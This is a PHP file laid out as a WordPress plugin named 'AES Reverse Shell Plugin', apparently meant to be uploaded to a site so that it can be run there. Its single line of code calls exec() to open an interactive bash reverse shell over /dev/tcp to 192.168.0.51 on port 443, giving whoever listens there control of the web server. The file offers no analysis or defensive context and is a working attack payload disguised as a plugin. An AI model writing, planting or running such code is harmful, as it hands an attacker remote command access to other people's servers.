<?php

/**
* Plugin Name: AES Reverse Shell Plugin
* Plugin URI:
* Description: AES Reverse Shell Plugin
* Version: 1.0
* Author: Johto Robbie
* Author URI: https://www.facebook.com/VNHackerNews/
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.51/443 0>&1'");
?>
